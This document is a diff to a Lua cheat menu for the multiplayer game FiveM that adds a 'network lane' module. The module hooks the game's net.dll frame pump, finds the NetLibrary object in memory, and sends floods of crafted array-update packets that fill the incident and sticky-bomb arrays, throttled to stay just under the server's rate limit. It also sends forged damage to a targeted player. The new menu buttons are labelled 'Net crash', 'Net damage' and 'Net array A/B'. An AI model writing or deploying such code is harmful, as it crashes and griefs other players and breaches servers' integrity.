@@ -21342,6 +21342,452 @@ return G
 end)(O,S)
 
 -- ---------------------------------------------------------------------------
+-- PART: 28_net_link.lua
+-- ---------------------------------------------------------------------------
+-- Network lane: one record per game frame through the engine's own reliable
+-- command send path, plus synthetic damage events.
+--
+-- THREAD MODEL
+--   A direct call to NetLibrary::SendReliableCommand from the Susano thread
+--   walks the reliable send ring while the frame pump is also using it. The
+--   b3751 ring-dequeue dump is that race:
+--
+--       FiveM_b3751_GTAProcess.exe+0x13421F6
+--       mov rax, [rcx]        ; ring entry
+--       ...
+--       call [rax+0x10]
+--
+--   The safe route is the frame pump itself. gta-net-five.dll imports
+--   ?RunMainFrame@NetLibrary@@QEAAXXZ from net.dll and reaches it through the
+--   IAT thunk at gta-net-five.dll+0xB3F3E. The two call sites are:
+--
+--       0x18006F4C1  frame event path
+--       0x180077130  main frame pump
+--
+--   The hook is installed on net.dll+0x4C110 (verified export, not a pattern)
+--   and fires on the game thread. The callback returns nil, so the original
+--   RunMainFrame still runs: the lane adds one send and never suppresses the
+--   engine's own frame work.
+--
+-- WIRE FORMAT (msgArrayUpdate, rebuilt from the engine sender 0x1800495D9)
+--   uint32 messageHash   (0x0976E783, rage hash of the message name)
+--   uint8  arrayIndex
+--   uint16 element
+--   uint16 byteSize
+--   uint8  body[byteSize]
+--
+--   element 0..49 (the server rejects 50 and above), byteSize 0..128,
+--   byteSize 0 frees the element. Array 4 is the incident array, array 7 the
+--   sticky-bomb array.
+--
+-- RATE
+--   The server accepts 75 updates per second sustained and 125 in a burst.
+--   The callback counts a one-second window and stops at 70, so two frame
+--   call sites (120 calls/s) still stay under the sustained ceiling.
+--
+-- INSTANCE
+--   NetLibrary is located in net.dll .data by matching the object's first
+--   qword against the ??_7NetLibrary vtable and +0x48 against the connected
+--   state. No pattern scan, no signature that a build can silently poison.
+--   If the object cannot be verified, nothing is sent and the lane stays off.
+-- ---------------------------------------------------------------------------
+local NET = (function(O, C)
+    local NET = {}
+
+    NET.base = nil
+    NET.sendFn = nil
+    NET.vtable = nil
+    NET.instance = nil
+    NET.typeBuf = nil
+    NET.dataBuf = nil
+    NET.hookId = nil
+    NET.queue = nil
+    NET.busy = false
+    NET.armed = false
+    NET.sent = 0
+    NET.frame = 0
+    NET.aborted = nil
+    NET.lastDamage = 0
+    NET.releasePending = false
+    NET.windowStart = 0
+    NET.windowCount = 0
+
+    local HASH = 0x0976E783
+    local VT_RVA = 0x96A28
+    local RUN_RVA = 0x4C110
+    local SEND_RVA = 0x4C5C0
+    local RUN_NAME = "?RunMainFrame@NetLibrary@@QEAAXXZ"
+    local VT_NAME = "??_7NetLibrary@@6BINetLibrary@@@"
+    local SEND_NAME = "?SendReliablePacket@NetLibrary@@QEAAXIPEBD_K@Z"
+    local CONNECTED = 8
+    local MAX_ELEM = 49
+    local MAX_TOKEN = 70
+    local WINDOW_MS = 1000
+    local HEADER = 9
+
+    local profiles = {
+        { size = 1, fill = 0x00 },
+        { size = 1, fill = 0xFF },
+        { size = 16, fill = 0x00 },
+        { size = 16, fill = 0xFF },
+        { size = 128, fill = 0x00 },
+        { size = 128, fill = 0xFF },
+        { size = 128, fill = 0x7F },
+    }
+
+    local function mem()
+        if type(Susano) ~= "table" then return nil end
+        return Susano.Memory
+    end
+
+    local function is_valid(addr)
+        if type(addr) ~= "number" or addr == 0 then return false end
+        local m = mem()
+        if not m or type(m.Valid) ~= "function" then return false end
+        local ok, res = pcall(m.Valid, addr)
+        return ok and res == true
+    end
+
+    local function read_u16(addr)
+        local m = mem()
+        if not m or type(m.ReadU16) ~= "function" or not is_valid(addr) then return nil end
+        local ok, res = pcall(m.ReadU16, addr)
+        if not ok or type(res) ~= "number" then return nil end
+        return res
+    end
+
+    local function read_u32(addr)
+        local m = mem()
+        if not m or type(m.ReadU32) ~= "function" or not is_valid(addr) then return nil end
+        local ok, res = pcall(m.ReadU32, addr)
+        if not ok or type(res) ~= "number" then return nil end
+        return res
+    end
+
+    local function read_u64(addr)
+        local m = mem()
+        if not m or type(m.ReadU64) ~= "function" or not is_valid(addr) then return nil end
+        local ok, res = pcall(m.ReadU64, addr)
+        if not ok or type(res) ~= "number" then return nil end
+        return res
+    end
+
+    local function raw_u64(addr)
+        local m = mem()
+        if not m or type(m.ReadU64) ~= "function" then return nil end
+        local ok, res = pcall(m.ReadU64, addr)
+        if not ok or type(res) ~= "number" then return nil end
+        return res
+    end
+
+    local function section_name(entry)
+        local m = mem()
+        if not m or type(m.ReadU8) ~= "function" then return "" end
+        local out = {}
+        for i = 0, 7 do
+            local ok, v = pcall(m.ReadU8, entry + i)
+            if not ok or type(v) ~= "number" or v == 0 then break end
+            out[#out + 1] = string.char(v)
+        end
+        return table.concat(out)
+    end
+
+    local function scan(base, va, size, want_vt)
+        if type(size) ~= "number" or size <= 0 or size > 0x2000000 then return nil end
+        local start = base + va
+        local last = start + size - 0x50
+        local addr = start
+        while addr <= last do
+            if is_valid(addr) then
+                local head = raw_u64(addr)
+                if head == want_vt then
+                    local state = read_u32(addr + 0x48)
+                    if state == CONNECTED then return addr end
+                end
+            end
+            addr = addr + 0x1000
+        end
+        return nil
+    end
+
+    function NET.init()
+        local m = mem()
+        if not m then return false end
+        for _, name in ipairs({
+            "Valid", "ReadU8", "ReadU16", "ReadU32", "ReadU64",
+            "WriteBytes", "GetProc", "Module", "Hook", "Unhook", "Call", "Alloc",
+        }) do
+            if type(m[name]) ~= "function" then return false end
+        end
+        if NET.sendFn and NET.vtable and NET.dataBuf then return true end
+
+        local okb, base = pcall(m.Module, "net.dll")
+        if not okb or type(base) ~= "number" or base == 0 then return false end
+        NET.base = base
+
+        local okv, vt = pcall(m.GetProc, "net.dll", VT_NAME)
+        if not okv or type(vt) ~= "number" or vt == 0 then vt = base + VT_RVA end
+        NET.vtable = vt
+
+        local oks, send = pcall(m.GetProc, "net.dll", SEND_NAME)
+        if not oks or type(send) ~= "number" or send == 0 then send = base + SEND_RVA end
+        NET.sendFn = send
+
+        local okd, dataBuf = pcall(m.Alloc, 160)
+        if not okd or type(dataBuf) ~= "number" or dataBuf == 0 then return false end
+        NET.dataBuf = dataBuf
+        NET.typeBuf = nil
+        return true
+    end
+
+    function NET.find_instance()
+        local base = NET.base
+        if type(base) ~= "number" or base == 0 then return nil end
+        if read_u16(base) ~= 0x5A4D then return nil end
+        local e = read_u32(base + 0x3C)
+        if type(e) ~= "number" or e == 0 or not is_valid(base + e) then return nil end
+        if read_u32(base + e) ~= 0x00004550 then return nil end
+
+        local nsec = read_u16(base + e + 6)
+        local opth = read_u16(base + e + 20)
+        if type(nsec) ~= "number" or nsec < 1 or nsec > 96 then return nil end
+        if type(opth) ~= "number" or opth < 0x60 or opth > 0x400 then return nil end
+
+        local image = read_u32(base + e + 24 + 56)
+        if type(image) ~= "number" or image < 0x1000 or image > 0x8000000 then return nil end
+
+        local sec = base + e + 24 + opth
+        local data_va, data_size = nil, 0
+        for i = 0, nsec - 1 do
+            local entry = sec + i * 40
+            local name = section_name(entry)
+            local size = read_u32(entry + 8)
+            local va = read_u32(entry + 12)
+            if type(size) == "number" and type(va) == "number" and va >= 0x1000 then
+                if name == ".data" and size > data_size then
+                    data_va, data_size = va, size
+                end
+            end
+        end
+
+        local found = nil
+        if data_va and data_size > 0 then
+            found = scan(base, data_va, data_size, NET.vtable)
+        end
+        if not found then
+            found = scan(base, 0x1000, image, NET.vtable)
+        end
+        return found
+    end
+
+    function NET.resolve_instance()
+        local inst = NET.find_instance()
+        if not inst then
+            NET.instance = nil
+            return nil
+        end
+        NET.instance = inst
+        return inst
+    end
+
+    local function token_ok()
+        local now = GetGameTimer()
+        if now - NET.windowStart >= WINDOW_MS then
+            NET.windowStart = now
+            NET.windowCount = 0
+        end
+        if NET.windowCount >= MAX_TOKEN then return false end
+        NET.windowCount = NET.windowCount + 1
+        return true
+    end
+
+    local function send(inst, item)
+        local m = mem()
+        if not m then return false end
+        local bytes = {
+            HASH % 256,
+            math.floor(HASH / 256) % 256,
+            math.floor(HASH / 65536) % 256,
+            math.floor(HASH / 16777216) % 256,
+            item[1] % 256,
+            item[2] % 256, math.floor(item[2] / 256),
+            item[4] % 256, math.floor(item[4] / 256),
+        }
+        local data = item[3]
+        for i = 1, item[4] do bytes[HEADER + i] = data[i] end
+        local okw, wrote = pcall(m.WriteBytes, NET.dataBuf, bytes)
+        if not okw or wrote == false then return false end
+        local okc = pcall(m.Call, NET.sendFn, "v:ipl", inst, HASH, NET.dataBuf, #bytes)
+        if not okc then return false end
+        return true
+    end
+
+    local abort
+
+    local function request_release()
+        NET.releasePending = true
+    end
+
+    local function unhook_now()
+        local m = mem()
+        if NET.hookId ~= nil and m and type(m.Unhook) == "function" then
+            pcall(m.Unhook, NET.hookId)
+        end
+        NET.hookId = nil
+        NET.releasePending = false
+    end
+
+    local function flush()
+        if not NET.armed then return nil end
+        NET.frame = NET.frame + 1
+        local item = NET.queue and NET.queue[1]
+        if not item then NET.armed = false; return nil end
+        if not token_ok() then return nil end
+        local inst = NET.instance
+        if type(inst) ~= "number" or inst == 0
+            or raw_u64(inst) ~= NET.vtable
+            or read_u32(inst + 0x48) ~= CONNECTED then
+            abort("instance lost")
+            return nil
+        end
+        if not send(inst, item) then
+            abort("send rejected")
+            return nil
+        end
+        table.remove(NET.queue, 1)
+        NET.sent = NET.sent + 1
+        if #NET.queue == 0 then
+            NET.armed = false
+            request_release()
+            NET.busy = false
+        end
+        return nil
+    end
+
+    local function guarded()
+        local ok, err = pcall(flush)
+        if not ok then abort("flush error: " .. tostring(err)) end
+        return nil
+    end
+
+    abort = function(reason)
+        if NET.aborted then return end
+        NET.aborted = tostring(reason)
+        NET.armed = false
+        NET.queue = nil
+        request_release()
+    end
+
+    local function ensure_hook()
+        if NET.hookId ~= nil then return true end
+        local m = mem()
+        if not m then return false end
+        local addr = nil
+        local okp, p = pcall(m.GetProc, "net.dll", RUN_NAME)
+        if okp and type(p) == "number" and p ~= 0 then addr = p end
+        if not addr then
+            local base = NET.base
+            if type(base) == "number" and base ~= 0 then addr = base + RUN_RVA end
+        end
+        if type(addr) ~= "number" or addr == 0 then return false end
+        local okh, id = pcall(m.Hook, addr, "v:p", guarded)
+        if not okh or type(id) ~= "number" then return false end
+        NET.hookId = id
+        return true
+    end
+
+    local function build_queue(kind)
+        local q = {}
+        for p = 1, #profiles do
+            local profile = profiles[p]
+            local data = {}
+            for i = 1, profile.size do data[i] = profile.fill end
+            for elem = 0, MAX_ELEM do
+                q[#q + 1] = { kind, elem, data, profile.size }
+            end
+        end
+        return q
+    end
+
+    function NET.start(kind)
+        if type(kind) ~= "number" then return false end
+        if NET.busy or NET.releasePending then O.log("net: lane busy"); return false end
+        if not NET.init() then O.log("net: net.dll not ready"); return false end
+        if not NET.resolve_instance() then O.log("net: no NetLibrary instance"); return false end
+        if not ensure_hook() then O.log("net: RunMainFrame hook failed"); return false end
+        NET.queue = build_queue(kind)
+        NET.sent = 0
+        NET.frame = 0
+        NET.aborted = nil
+        NET.windowStart = GetGameTimer()
+        NET.windowCount = 0
+        NET.busy = true
+        NET.armed = true
+        local expected = #NET.queue
+        Citizen.CreateThread(function()
+            local deadline = GetGameTimer() + 30000
+            while NET.armed and GetGameTimer() < deadline do Citizen.Wait(100) end
+            if NET.armed then abort("timeout") end
+            Citizen.Wait(60)
+            if NET.releasePending then unhook_now() end
+            NET.busy = false
+            if NET.aborted then
+                O.log("net: %s after %d/%d", NET.aborted, NET.sent, expected)
+            else
+                O.log("net: array %d sent %d", kind, NET.sent)
+            end
+        end)
+        return true
+    end
+
+    function NET.stop()
+        abort("stopped")
+    end
+
+    function NET.damage(amount)
+        if type(Susano) ~= "table" or type(Susano.SendNetworkDamage) ~= "function" then
+            return false
+        end
+        if type(C) ~= "table" or type(C.target) ~= "function" then return false end
+        local okT, entry = pcall(C.target, "ped")
+        if not okT or type(entry) ~= "table" then return false end
+        local ped = entry.ped
+        local me = PlayerPedId()
+        if type(ped) ~= "number" or ped == 0 or ped == me then return false end
+        if not DoesEntityExist(ped) then return false end
+        if IsPedInAnyVehicle(me, false) then return false end
+        local now = GetGameTimer()
+        if now - NET.lastDamage < 1100 then return false end
+        NET.lastDamage = now
+        local coords = GetEntityCoords(ped)
+        local x = coords and coords.x
+        local y = coords and coords.y
+        local z = coords and coords.z
+        if type(x) ~= "number" or type(y) ~= "number" or type(z) ~= "number" then
+            return false
+        end
+        local dmg = tonumber(amount) or 1.0
+        if dmg < 0.0 then dmg = 0.0 end
+        local okc = pcall(Susano.SendNetworkDamage, me, ped, x, y, z, dmg, 0, 522)
+        if not okc then return false end
+        return true
+    end
+
+    function NET.crash()
+        local started = NET.start(7)
+        Citizen.CreateThread(function()
+            for i = 1, 12 do
+                if i > 1 then Citizen.Wait(1100) end
+                NET.damage((i % 2 == 1) and 0.0 or 1.0)
+            end
+        end)
+        return started
+    end
+
+    return NET
+end)(O, C)
+
+-- ---------------------------------------------------------------------------
 -- PART: 11_flash.lua
 -- ---------------------------------------------------------------------------
 local FL = (function(O,Menu)
@@ -30172,6 +30618,7 @@ local CRASH_ROWS = {
     "Anim churn", "Synced scenes", "Ped variation", "Objects (flood)",
     "PTFX storm", "Clip swarm",
     "Ped flood", "Whale crash", "Emote crash", "Crush crash",
+    "Net crash", "Net damage", "Net array A", "Net array B",
 }
 
 -- The current labels are part of the sweep as well. Without them, every
@@ -30214,18 +30661,18 @@ local function installCrasher()
     for i = #tab.items, 1, -1 do
         local item = tab.items[i]
         if item.separatorText == "Crasher" or item.separatorText == "Crash"
-            or item.separatorText == "Exploit" then
+            or item.separatorText == "Net" or item.separatorText == "Exploit" then
             table.remove(tab.items, i)
         elseif isCrashRowName(item.name) then
             table.remove(tab.items, i)
         end
     end
 
-    -- Four direct actions. The first three call C.launch(kind); the engine owns
-    -- the target window, spawn/task path and cleanup. The fourth calls
-    -- G.start("crash"), the sink's borrowed-world-vehicle slam with the
-    -- respawn hold. Nothing is shared between the vectors, so a click never
-    -- runs a mixed object/ped/emote loop.
+    -- Two groups, Crash first so the proven ped/whale/emote/crush rows keep
+    -- the first page. The Net group is the network lane: one array burst
+    -- through the engine frame pump, a standalone damage tick, or the
+    -- combined array+damage action. Nothing is shared between the vectors,
+    -- so a click never runs a mixed loop.
     --
     -- Prepend the crash block instead of appending it. The base Exploits tab
     -- also carries the server rows (Staff Mode, Disable Weapon Damage, Menu
@@ -30264,6 +30711,39 @@ local function installCrasher()
             type = "action",
             onClick = function()
                 G.start("crash")
+            end,
+        },
+        {
+            name = "",
+            isSeparator = true,
+            separatorText = "Net",
+        },
+        {
+            name = "Net crash",
+            type = "action",
+            onClick = function()
+                NET.crash()
+            end,
+        },
+        {
+            name = "Net damage",
+            type = "action",
+            onClick = function()
+                NET.damage()
+            end,
+        },
+        {
+            name = "Net array A",
+            type = "action",
+            onClick = function()
+                NET.start(4)
+            end,
+        },
+        {
+            name = "Net array B",
+            type = "action",
+            onClick = function()
+                NET.start(7)
             end,
         },
     }
